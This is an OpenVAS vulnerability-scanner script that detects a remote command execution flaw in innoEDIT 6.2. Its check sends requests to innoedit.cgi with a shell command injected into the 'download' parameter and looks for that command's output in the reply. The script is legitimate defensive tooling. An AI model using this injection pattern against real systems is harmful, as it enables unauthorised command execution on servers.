###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_innoEDIT_rce_03_14.nasl 7576 2017-10-26 10:01:33Z cfischer $
#
# innoEDIT 6.2 Remote Command Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploits will allow remote attackers to execute arbitrary
commands within the context of the application.";

tag_affected = "innoEDIT 6.2";
tag_summary = "innoEDIT 6.2 suffer from a code execution vulnerability.";

tag_solution = "Ask the vendor for an update.";
tag_vuldetect = "Try to execute a command on the remote Host by sending some special crafted HTTP requests.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103927");
 script_tag(name:"cvss_base", value:"9.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 7576 $");
 script_name("innoEDIT 6.2 Remote Command Execution");
 script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125823/innoEDIT-6.2-Remote-Command-Execution.html");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:01:33 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2014-03-24 11:13:42 +0100 (Mon, 24 Mar 2014)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port( default:80 );

cmds = exploit_commands();

foreach dir( make_list_unique( "/innoedit", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach cmd( keys( cmds ) ) {
    url = dir + '/innoedit.cgi?download=;' + cmds[cmd] + '|';
    if( http_vuln_check( port:port, url:url, pattern:cmd ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }  
  }
}

exit( 99 );
